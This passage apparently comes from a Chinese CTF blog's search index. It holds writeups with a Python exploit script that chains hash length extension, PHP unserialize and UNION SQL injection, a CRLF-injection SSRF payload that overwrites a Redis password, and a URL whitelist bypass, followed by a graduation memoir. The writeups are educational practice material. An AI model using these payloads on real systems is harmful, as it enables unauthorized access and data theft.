-&gt; int:</span></span><br><span class=\"line\">    a = requests.post(addr + <span class=\"string\">&quot;forget.php&quot;</span>, data=&#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;username&quot;</span>: <span class=\"string\">&quot;admin&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;mibao&quot;</span>: <span class=\"string\">&quot;mibao&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;pass&quot;</span>: <span class=\"string\">&quot;3werwer&quot;</span>,</span><br><span class=\"line\">        <span class=\"string\">&quot;forget&quot;</span>: <span class=\"string\">&quot;1&quot;</span></span><br><span class=\"line\">    &#125;, allow_redirects=<span class=\"literal\">False</span>)</span><br><span class=\"line\">    md5 = b64decode(parse_qs(a.headers[<span class=\"string\">&#x27;Location&#x27;</span>])[<span class=\"string\">&#x27;check&#x27;</span>][<span class=\"number\">0</span>])</span><br><span class=\"line\">    print(md5.decode())</span><br><span class=\"line\">    <span class=\"keyword\">return</span> md5.decode()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_fake_md5</span>(<span class=\"params\">md5: str</span>) -&gt; dict:</span></span><br><span class=\"line\">    result = subprocess.getoutput(<span class=\"string\">&quot;python2 md5pad.py &#123;0&#125; admin 16&quot;</span>.format(md5))</span><br><span class=\"line\">    print(result)</span><br><span class=\"line\">    final = dict()</span><br><span class=\"line\">    payload = result.splitlines()[<span class=\"number\">0</span>]</span><br><span class=\"line\">    final[<span class=\"string\">&#x27;payload&#x27;</span>] = payload[<span class=\"number\">11</span>:<span class=\"number\">-6</span>]</span><br><span class=\"line\">    final[<span class=\"string\">&#x27;md5&#x27;</span>] = result.splitlines()[<span class=\"number\">2</span>][<span class=\"number\">5</span>:]</span><br><span class=\"line\">    print(final)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> final</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">send_api</span>(<span class=\"params\">result: dict, userid: int</span>):</span></span><br><span class=\"line\">    php_content = <span class=\"string\">r&#x27;&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"string\">class admin</span></span><br><span class=\"line\"><span class=\"string\">&#123;</span></span><br><span class=\"line\"><span class=\"string\">    var $name = &quot;admin&quot;;</span></span><br><span class=\"line\"><span class=\"string\">    var $check = &quot;%s&quot;;</span></span><br><span class=\"line\"><span class=\"string\">    var $data = &quot;%s&quot;;</span></span><br><span class=\"line\"><span class=\"string\">    var $method = &quot;del_user&quot;;</span></span><br><span class=\"line\"><span class=\"string\">    var $userid = %d;</span></span><br><span class=\"line\"><span class=\"string\">    var $msgid;</span></span><br><span class=\"line\"><span class=\"string\">&#125;</span></span><br><span class=\"line\"><span class=\"string\">$a = serialize(new admin());</span></span><br><span class=\"line\"><span class=\"string\">echo base64_encode($a);&#x27;&#x27;&#x27;</span>%(result[<span class=\"string\">&#x27;md5&#x27;</span>], result[<span class=\"string\">&#x27;payload&#x27;</span>], userid)</span><br><span class=\"line\">    file = open(<span class=\"string\">&quot;tmp.php&quot;</span>, <span class=\"string\">&#x27;w&#x27;</span>)</span><br><span class=\"line\">    file.write(php_content)</span><br><span class=\"line\">    payload = subprocess.getoutput(<span class=\"string\">&quot;php -r &#x27;&#123;0&#125;&#x27;&quot;</span>.format(php_content))</span><br><span class=\"line\">    print(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">    a = requests.get(addr + <span class=\"string\">&quot;api.php&quot;</span>, params=&#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;api&quot;</span>: payload</span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">    print(a.text)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">sql_inj</span>(<span class=\"params\">a: requests.Session</span>):</span></span><br><span class=\"line\">    b = a.get(addr + <span class=\"string\">&quot;riji.php&quot;</span>, params=&#123;</span><br><span class=\"line\">        <span class=\"string\">&quot;id&quot;</span>: <span class=\"string\">&quot;-1 union select 1,2,flag from flag&quot;</span></span><br><span class=\"line\">    &#125;)</span><br><span class=\"line\">    print(b.text)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&quot;__main__&quot;</span>:</span><br><span class=\"line\">    username = register(a)</span><br><span class=\"line\">    userid = login(a, username)</span><br><span class=\"line\">    admin_md5 = get_admin_md5()</span><br><span class=\"line\">    result=get_fake_md5(admin_md5)</span><br><span class=\"line\">    send_api(result,userid)</span><br><span class=\"line\">    sql_inj(a)</span><br></pre></td></tr></table></figure></p>\r\n\n    <div id=\"aplayer-kfyHcORt\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"479408220\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"true\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#ad7a86\" data-loop=\"all\"\n    ></div>\r\n<p>flag{0aa97a23-a64f-415c-a75e-40b7ce271d38}</p>\r\n","categories":["Writeups"],"tags":["Unserialize","PHP","Web","SQL注入","哈希扩展攻击"]},{"title":"SWPUCTF-2016-Web7","url":"/2019/09/12/SWPUCTF-2016-Web7/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><p>SWPUCTF 2016的Web7，老题了。不过题目环境有点苛刻。Python 2.7.5+Redis 2.6。毕竟出题时是2016年。 给出了源码： <a id=\"more\"></a> <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/python </span></span><br><span class=\"line\"><span class=\"comment\"># coding:utf8</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> cherrypy</span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib2</span><br><span class=\"line\"><span class=\"keyword\">import</span> redis</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">web7</span>:</span></span><br><span class=\"line\"><span class=\"meta\">    @cherrypy.expose</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">index</span>(<span class=\"params\">self</span>):</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;&lt;script&gt; window.location.href=&#x27;/input&#x27;;&lt;/script&gt;&quot;</span></span><br><span class=\"line\"><span class=\"meta\">    @cherrypy.expose</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">input</span>(<span class=\"params\">self,url=<span class=\"string\">&quot;&quot;</span>,submit=<span class=\"string\">&quot;&quot;</span></span>):</span></span><br><span class=\"line\">        file=open(<span class=\"string\">&quot;index.html&quot;</span>,<span class=\"string\">&quot;r&quot;</span>).read()</span><br><span class=\"line\">        reheaders=<span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> cherrypy.request.method==<span class=\"string\">&quot;GET&quot;</span>:</span><br><span class=\"line\">            reheaders=<span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            url=cherrypy.request.params[<span class=\"string\">&quot;url&quot;</span>]</span><br><span class=\"line\">            submit=cherrypy.request.params[<span class=\"string\">&quot;submit&quot;</span>]</span><br><span class=\"line\">            <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> urllib2.urlopen(url).info().headers:</span><br><span class=\"line\">                    reheaders=reheaders+x+<span class=\"string\">&quot;&lt;br&gt;&quot;</span></span><br><span class=\"line\">            <span class=\"keyword\">except</span> Exception,e:</span><br><span class=\"line\">                reheaders=<span class=\"string\">&quot;错误&quot;</span>+str(e)</span><br><span class=\"line\">            <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> urllib2.urlopen(url).info().headers:</span><br><span class=\"line\">                reheaders=reheaders+x+<span class=\"string\">&quot;&lt;br&gt;&quot;</span></span><br><span class=\"line\">        file=file.replace(<span class=\"string\">&quot;&lt;?response?&gt;&quot;</span>,reheaders)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> file</span><br><span class=\"line\"><span class=\"meta\">    @cherrypy.expose</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">login</span>(<span class=\"params\">self,password=<span class=\"string\">&quot;&quot;</span>,submit=<span class=\"string\">&quot;&quot;</span></span>):</span></span><br><span class=\"line\">        pool = redis.ConnectionPool(host=<span class=\"string\">&#x27;127.0.0.1&#x27;</span>, port=<span class=\"number\">6379</span>)</span><br><span class=\"line\">        r = redis.Redis(connection_pool=pool)</span><br><span class=\"line\">        re=<span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">        file=open(<span class=\"string\">&quot;login.html&quot;</span>,<span class=\"string\">&quot;r&quot;</span>).read()</span><br><span class=\"line\">        <span class=\"keyword\">if</span> cherrypy.request.method==<span class=\"string\">&quot;GET&quot;</span>:</span><br><span class=\"line\">            re=<span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            password=cherrypy.request.params[<span class=\"string\">&quot;password&quot;</span>]</span><br><span class=\"line\">            submit=cherrypy.request.params[<span class=\"string\">&quot;submit&quot;</span>]</span><br><span class=\"line\">            <span class=\"keyword\">if</span> r.get(<span class=\"string\">&quot;admin&quot;</span>)==password:</span><br><span class=\"line\">                re=open(<span class=\"string\">&quot;flag&quot;</span>,<span class=\"string\">&#x27;r&#x27;</span>).readline()</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                re=<span class=\"string\">&quot;Can&#x27;t find admin:&quot;</span>+password+<span class=\"string\">&quot;,fast fast fast.....&quot;</span></span><br><span class=\"line\">        file=file.replace(<span class=\"string\">&quot;&lt;?response?&gt;&quot;</span>,re)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> file</span><br><span class=\"line\">cherrypy.config.update(&#123;<span class=\"string\">&#x27;server.socket_host&#x27;</span>: <span class=\"string\">&#x27;0.0.0.0&#x27;</span>,</span><br><span class=\"line\">                        <span class=\"string\">&#x27;server.socket_port&#x27;</span>: <span class=\"number\">8080</span>,</span><br><span class=\"line\">                       &#125;)</span><br><span class=\"line\">cherrypy.quickstart(web7(),<span class=\"string\">&#x27;/&#x27;</span>)</span><br></pre></td></tr></table></figure> 我们有两个输入点，一个<code>/input</code>允许我们输入URL，然后会用urllib2.urlopen()访问我们的URL。还有一个<code>/login</code>，要求我们输入管理员的密码，如果与Redis数据库中的密码相同，我们就可以拿到Flag。 好了，看起来没有什么问题，SSRF。然后问题来了，urllib2.urlopen()只支持HTTP HTTPS FTP File这几种Schema，我们没法用gopher，也就没法打到Redis。然后我们就试图搜一下urllib2.urlopen()是不是出过什么洞，然后就找到<a href=\"https://bugs.python.org/issue30458\">这个</a>。简单来说，就是urlopen()处理URL的时候没有考虑换行符，导致我们可以在正常的HTTP头中插入任意内容。就像这样： <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">urlopen(<span class=\"string\">&quot;http://127.0.0.1%0D%0A%20SLAVEOF . . . :6379/&quot;</span>)</span><br><span class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>pprint(conn.recv(<span class=\"number\">300</span>).splitlines(keepends=<span class=\"literal\">True</span>))</span><br><span class=\"line\">[<span class=\"string\">b&#x27;GET / HTTP/1.1\\r\\n&#x27;</span>,</span><br><span class=\"line\"> <span class=\"string\">b&#x27;Accept-Encoding: identity\\r\\n&#x27;</span>,</span><br><span class=\"line\"> <span class=\"string\">b&#x27;Host: 127.0.0.1\\r\\n&#x27;</span>,</span><br><span class=\"line\"> <span class=\"string\">b&#x27; SLAVEOF . . . :6379\\r\\n&#x27;</span>,</span><br><span class=\"line\"> <span class=\"string\">b&#x27;Connection: close\\r\\n&#x27;</span>,</span><br><span class=\"line\"> <span class=\"string\">b&#x27;User-Agent: Python-urllib/2.7\\r\\n&#x27;</span>,</span><br><span class=\"line\"> <span class=\"string\">b&#x27;\\r\\n&#x27;</span>]</span><br></pre></td></tr></table></figure> 好了，我们只要在正常URL中插入%0d%0a就可以了。所以我们的思路其实非常简单：向Redis写数据，改掉admin的密码就好了。Redis改数据用set指令就好了。然后换行用%0d%0a。所以，Payload：<code>http://127.0.0.1%0d%0aset%20admin%20admin%0d%0asave%0d%0a:6379/foo</code> 然后我们登录/login，输入admin就可以了。不过动作要快，因为admin密码会定时修改。</p>\r\n<p>P.S. 根据<a href=\"https://blog.csdn.net/niexinming/article/details/53024755\">这篇文章</a>的思路没什么问题，但是我没有搞明白为什么要改数据库的位置。</p>\r\n\n    <div id=\"aplayer-QhWBeCyH\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"5308001\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"true\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#ad7a86\" data-loop=\"all\"\n    ></div>\r\n<p>flag{e48f5fcb-2ca6-471e-a1e1-c7fbb82d8bfb}</p>\r\n","categories":["Writeups"],"tags":["Web","Python","Redis","SSRF","Cherrypy","CVE-2016-5699","CRLF Injection"]},{"title":"USTC-Hackergame-2019-网页读取器","url":"/2019/10/26/USTC-Hackergame-2019-%E7%BD%91%E9%A1%B5%E8%AF%BB%E5%8F%96%E5%99%A8/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><p>很明显的，在考察SSRF，然后有源码： <a id=\"more\"></a> <figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> flask <span class=\"keyword\">import</span> Flask, render_template, request, send_from_directory</span><br><span class=\"line\"><span class=\"keyword\">import</span> requests  <span class=\"comment\"># well, requests is designed for humans, and I like it.</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">app = Flask(__name__)</span><br><span class=\"line\">whitelist_hostname = [<span class=\"string\">&quot;example.com&quot;</span>,</span><br><span class=\"line\">                     <span class=\"string\">&quot;www.example.com&quot;</span>]</span><br><span class=\"line\">whitelist_scheme = [<span class=\"string\">&quot;http://&quot;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">check_hostname</span>(<span class=\"params\">url</span>):</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> whitelist_scheme:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> url.startswith(i):</span><br><span class=\"line\">            url = url[len(i):]  <span class=\"comment\"># strip scheme</span></span><br><span class=\"line\">            url = url[url.find(<span class=\"string\">&quot;@&quot;</span>) + <span class=\"number\">1</span>:]  <span class=\"comment\"># strip userinfo</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> url.find(<span class=\"string\">&quot;/&quot;</span>) == <span class=\"number\">-1</span>:</span><br><span class=\"line\">                url = url[:url.find(<span class=\"string\">&quot;/&quot;</span>)]  <span class=\"comment\"># strip parts after authority</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> url.find(<span class=\"string\">&quot;:&quot;</span>) == <span class=\"number\">-1</span>:</span><br><span class=\"line\">                url = url[:url.find(<span class=\"string\">&quot;:&quot;</span>)]  <span class=\"comment\"># strip port</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> url <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> whitelist_hostname:</span><br><span class=\"line\">                <span class=\"keyword\">return</span> (<span class=\"literal\">False</span>, <span class=\"string\">&quot;hostname &#123;&#125; not in whitelist&quot;</span>.format(url))</span><br><span class=\"line\">            <span class=\"keyword\">return</span> (<span class=\"literal\">True</span>, <span class=\"string\">&quot;ok&quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> (<span class=\"literal\">False</span>, <span class=\"string\">&quot;scheme not in whitelist, only &#123;&#125; allowed&quot;</span>.format(whitelist_scheme))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(&quot;/&quot;)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">index</span>():</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> render_template(<span class=\"string\">&quot;index.html&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(&quot;/request&quot;)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">req_route</span>():</span></span><br><span class=\"line\">    url = request.args.get(<span class=\"string\">&#x27;url&#x27;</span>)</span><br><span class=\"line\">    status, msg = check_hostname(url)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> status <span class=\"keyword\">is</span> <span class=\"literal\">False</span>:</span><br><span class=\"line\">        <span class=\"comment\"># print(msg)</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> msg</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        r = requests.get(url, timeout=<span class=\"number\">2</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> r.status_code == <span class=\"number\">200</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"string\">&quot;We tried accessing your url, but it does not return HTTP 200. Instead, it returns &#123;&#125;.&quot;</span>.format(r.status_code)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> r.text</span><br><span class=\"line\">    <span class=\"keyword\">except</span> requests.Timeout:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;We tried our best, but it just timeout.&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">except</span> requests.RequestException:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;While accessing your url, an exception occurred. There may be a problem with your url.&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@app.route(&quot;/source&quot;)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_source</span>():</span></span><br><span class=\"line\">    <span class=\"comment\"># return &quot;While accessing your url, an exception occurred. There may be a problem with your url.&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> send_from_directory(<span class=\"string\">&quot;static/&quot;</span>, <span class=\"string\">&quot;app.py&quot;</span>, as_attachment=<span class=\"literal\">True</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    app.run(<span class=\"string\">&quot;0.0.0.0&quot;</span>, <span class=\"number\">8000</span>, debug=<span class=\"literal\">False</span>) </span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\r\n<p>我们提交url，过check_hostname()检测后就会用requests.get()得到response.text。那么我们来看一下check_hostname()。它没有使用urllib，而是自己写了一套逻辑，大概率就是这里有问题了。</p>\r\n<p>首先去掉了\"http://\"，然后去掉了\"@\"之前的所有东西，去掉了第一个\"/\"之后的所有东西，还去掉了第一个\":\"之后的所有东西，最后剩余了理所当然就是主机名了。如果不在whitelist_hostname里就return False。</p>\r\n<p>看起来没什么问题。这题的考点在于URL组成部分里可以有其他的东西，来源与<span class=\"github-emoji\" data-alias=\"orange\" style=\"\" data-fallback-src=\"https://github.githubassets.com/images/icons/emoji/unicode/1f34a.png?v8\">🍊</span>在Blackhat上的演讲：</p>\r\n<div class=\"pdfobject-container\" data-target=\"us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf\" data-height=\"500px\"></div>\r\n<p>如果我们在URL中加入<code>#</code>或者<code>?</code>，它们后面的内容默认是全部丢弃的。可参考如下：</p>\r\n<div class=\"pdfobject-container\" data-target=\"testurl.pdf\" data-height=\"500px\"></div>\r\n<p>因此我们构造Payload为：<code>http://web1/flag#@example.com</code>，requests.get()在处理带<code>#</code>的URL，会将<code>#</code>后面的所有内容丢弃，但是check_hostname()没有检查<code>#</code>，我们用<code>@</code>掩盖之前的所有内容，并加入example.com通过检查。把<code>#</code>换成<code>?</code>也可以。</p>\r\n\n    <div id=\"aplayer-fBTlmyjN\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"28282178\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"true\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#ad7a86\" data-loop=\"all\"\n    ></div>\r\n<p>flag{dda3fd30-7ad6-4b70-926d-02ee8bc81ca6}</p>\r\n","categories":["Writeups"],"tags":["Web","Python"]},{"title":"Hello World","url":"/2020/09/01/hello-world/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><p>硬盘坏了，博客源码都丢了。慢慢补吧，毕业了，尽量抽时间写博客了。 P.S. 本博客所涉及题目全部可在https://github.com/Tiaonmmn中找到。</p>\r\n\n    <div id=\"aplayer-FLjRVCxZ\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"441835243\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"true\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#ad7a86\" data-loop=\"all\"\n    ></div>\r\n<p>flag{60afaee8-fee2-4658-bff5-80ee990fd612}</p>\r\n"},{"title":"flag{thats_it}","url":"/2019/06/12/flag-thats-it/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><p>要毕业了，第三届蓝帽杯初赛打完，4年CTF生涯也算正式结束了，小小的纪念一下自己的所作所为吧。文笔不行，见谅。</p>\r\n<h1 id=\"part-1.why-am-i-here\">Part 1.Why am I here?</h1>\r\n<p>我自7岁起就接触计算机了，DOS、Windows 98、Windows ME、Windows 2000等系统我是实际使用过的。一直觉得好玩，计算机的世界很有趣。 <a id=\"more\"></a> 我就读于中国人民公安大学，这是一所被称为“警中清华”的学校。为什么我会来到这里？很简单，父母要求的。说来惭愧，我在高中的时候成绩不是很好，高三下学期两次模拟的时候一次495，一次525。然后就被认为是上不了一本的货，想着以后当个警察，至少稳定。所以，高考志愿的时候我就报了个中国人民公安大学的提前批。结果成绩下来，605（当年一本分数线500）。行吧，去也得去，不去也得去了，当时报志愿的时候，家里给我的唯一自主选择权就是专业，自不必说，网络安全与执法了。</p>\r\n<p>就这样，我来到了中国人民公安大学网络安全与执法大队，开始了四年求学生活。</p>\r\n<h1 id=\"part-2.how-is-it-here\">Part 2.How is it here?</h1>\r\n<p>回忆警校生活，估计每个当事人都要讲一遍惨不忍睹的军训。警校的军训应该是军校以外最严格的了。我们这一届很幸运（或者说不幸），被安排在学校内军训。然后就是被各种安排，当时的各种疼，各种累，现在发现都想不起来了，记得的都是教官与同学们之间有趣的事情了。</p>\r\n<p>正式开学后，照常是警务化管理，早上6点30要跑操，7点35要集合走队列上课，无处不在的警督时刻抓你上课睡觉、警容不整，每周还至少一次的5公里长跑，晚上10点30准时熄灯不准玩手机，等等。我个人倒是挺习惯的，没觉得有什么压力。就这么正常的坚持了4年。</p>\r\n<p>警校里学习成绩也是很重要的，不要被某些电影带偏了。至少在这里，学习成绩决定着入党名额、奖学金、干部名额这些涉及到切身利益的东西。以及，挂科是很难受的，因为会耽误你评上上述那些东西的资格。好在，我苟住了，没有挂过科。</p>\r\n<p>期间作为警校生，各种乱七八糟的安保、实习什么的自然是接触过，G20、一带一路、上合峰会，一个都没落下全赶上了。派出所实习也体验到了人生百态，抓过嫖，带过人，监狱看守所什么的看门老大爷都快认识了。</p>\r\n<p>大一到大四一晃就过去了，大四上学期基本就一直在为找工作做准备，然后现在工作还是没定的状态。大四下就在写毕业论文，然后就在懵懵懂懂中迎来了毕业。</p>\r\n<h1 id=\"part-3.when-in-ctf\">Part 3.When in CTF?</h1>\r\n<p>其实来到这个专业的时候，我以为同学都是至少有点网络安全基本知识的，最起码自己安装个系统是没啥问题的。结果我发现我错了，很多人是不会的。所以在大一的时候，全区队的笔记本电脑我应该是都修过的，当然，业务偶尔延伸到其他区队。</p>\r\n<p>可能是因为会修电脑？有一天2012级的吴凡师姐突然加我微信问我有没有兴趣参加他们的组织？当时应该叫做网络特警队来着的，答应以后就碰到了一大票师兄师姐，像周之童师兄、曾宇圣师兄（nonick，鸡丁师傅），吴凡师姐（阿里大佬）等人，他们告诉我有种东西叫CTF，然后我就入坑了。2333333。记得很清楚，第一场参加的比赛是ZCTF2015，看了个Misc，一个流量题，提出来了个压缩包，然后怎么都找不到密码，赛后发现是个网页里提到了password，还是个中文密码。第一次参加就被这么套路，不过依然觉得很有意思。此后就在各位大佬的带领下，组了个队（队名应该都知道了，宫保鸡丁），以赛代练，打怪升级。</p>\r\n<p>然后，12级的就毕业了，就轮到我们了。按理来讲，这种成队伍的组织应该是一届届的传下去的，很不幸的，到13级这里断了。只有14级的几个师兄和我还有Vicen在坚持走下去。其实现在回忆一下，我们也是比较惨的，可以说整个学校，只有我们不到10个人听说过CTF这个东西并且有一定基础能够参与，每次比赛都只能在宿舍或者空教室里打，还要时常被各种奇怪活动打断，能坚持下来感觉也是蛮不可思议的了。好在G20安保的时候得到了学院的支持，参加了第一届XMan夏令营，认识了许多前辈与一起玩的小伙伴，算是真正的能叫做一名CTF选手了。</p>\r\n<p>14级师兄们毕业以后，就剩下了我和Vicen两个人能打了，结果就是我们两个人扛了2017-2019年几乎所有的比赛。真的很累，两个人从早做到晚，结果发现还剩下70%左右的题目没做，那个时候明白了什么叫做力不从心。后来学院成立了个网络安全实验班，不知道是不是因为我们，但确实我们看到了下一代的希望，现在，在S.W.A.T（什么鬼ID）同学的带领下，他们能够出现在比赛排名的前100、前50、前25里，至于这个队伍以后会是什么样子，我也不知道，但人类最伟大的智慧包含在四个字里，“等待”与“希望”嘛。</p>\r\n<p>以及，Web狗在CTF里是没有活路的，Pwn才是爷爷。我不做Web了，JoJo！</p>\r\n<h1 id=\"part-4.conclusion\">Part 4.Conclusion</h1>\r\n<p>看了berTrAM的文章才想起来我们也要走了，写着写着就突然不想写了，总感觉真的写完了，所有发生过的事情也真的就只能成为回忆了。大概这就叫做“临表涕零，不知所言”吧。</p>\r\n<p>最后，当然是致谢部分啦（无顺序排列）：</p>\r\n<p>感谢Vicen，陪我扛了几乎所有的比赛。</p>\r\n<p>感谢各位12级的师兄师姐，带我入坑。</p>\r\n<p>感谢136、333的各位，在四年里提供的无私关怀（老父亲对儿子的那种）。</p>\r\n<p>感谢高见老师，给我们提供了大量的帮助。</p>\r\n<p>感谢房长明队长，在G20等安保期间帮我们搞定了乱七八糟的问题，以及四年的陪伴。</p>\r\n<p>感谢421的各位，给了个在学生会里有个能闲聊能熬夜的地方。</p>\r\n<p>感谢invictus0510，公安大学里结交的挚友。</p>\r\n<p>感谢2017级网络安全实验班的各位同学，让我看到了以后的希望。</p>\r\n<p>//最后，感谢一下没有四年来没有出现的女（男？）朋友，让我能够不分心？??？?？</p>\r\n\n    <div id=\"aplayer-UaPQQKQE\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"101913\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"true\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#ad7a86\" data-loop=\"all\"\n    ></div>\r\n<p>flag{813d3d43-efe9-457a-bfee-2fd9009d09aa}</p>\r\n","categories":["Something else"],"tags":["Balabala"]},{"title":"常用配置文件地址","url":"/2019/10/06/%E5%B8%B8%E7%94%A8%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E5%9C%B0%E5%9D%80/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><p>记一下常见的配置文件所在位置（默认配置）：</p>\r\n<ul>\r\n<li>Alpine Linux Docker的Apache2配置文件：/etc/apache2/httpd.conf（主配置文件），其余文件在/etc/apache2目录下</li>\r\n<li>OpenResty环境下的Nginx配置文件：/usr/local/openresty/nginx/conf/nginx.conf</li>\r\n<li>Nginx的配置文件：/usr/local/nginx/conf/nginx.conf（题目出现过，但我不知道什么样的系统环境）</li>\r\n</ul>\r\n\n    <div id=\"aplayer-eCnCHTSy\" class=\"aplayer aplayer-tag-marker 